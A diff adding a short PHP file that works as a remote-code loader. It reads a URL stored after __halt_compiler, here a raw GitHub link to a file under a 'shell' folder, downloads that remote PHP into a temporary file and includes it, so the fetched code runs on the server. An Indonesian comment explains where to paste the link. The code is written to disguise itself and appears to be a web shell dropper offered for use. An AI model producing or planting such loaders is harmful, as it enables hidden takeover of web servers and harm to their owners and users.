@@ -1,0 +1,11 @@
+<?php
+$fp = fopen(__FILE__, 'r');
+fseek($fp, __COMPILER_HALT_OFFSET__);
+$temp_filee = tmpfile(); 
+fwrite($temp_filee, implode('', file(stream_get_contents($fp))));
+include stream_get_meta_data($temp_filee)['uri'];
+fclose($temp_filee);
+
+// the end of the script execution
+__halt_compiler
+/*Link URL TARO SETELAH TANDA "()"*/();https://raw.githubusercontent.com/WhatsWrongAndWhy/yourlogic/main/shell/fanvat.php
